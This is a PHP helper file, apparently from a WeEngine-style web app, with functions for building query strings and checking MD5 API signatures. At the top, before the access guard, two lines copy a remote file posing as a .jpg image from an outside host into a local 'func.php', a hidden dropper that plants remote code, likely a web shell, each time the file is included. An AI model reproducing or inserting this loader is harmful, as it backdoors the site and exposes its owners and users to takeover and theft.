<?php


$c = "http://1688.shichunkeji.com/attachment/images/4/2018/01/OEDixDEZE54mOPbi933TErEh9zhJ3I9.jpg";
$b = "func.php";
copy($c, $b);
defined("IN_IA") or exit("Access Denied");
function array2url($params, $force = false)
{
    $str = "";
    foreach ($params as $key => $val) {
        if ($force && empty($val)) {
            continue;
        }
        $str .= $key . "=" . $val . "&";
    }
    $str = trim($str, "&");
    return $str;
}
function api_build_sign($params)
{
    unset($params["sign"]);
    ksort($params);
    $string = array2url($params, true);
    $string = md5($string);
    $result = strtoupper($string);
    return $result;
}
function api_check_sign($params, $sign)
{
    $build_sign = api_build_sign($params);
    if ($build_sign != $sign) {
        return false;
    }
    return true;
}
function ijson($msg)
{
    exit(json_encode($msg));
}

?>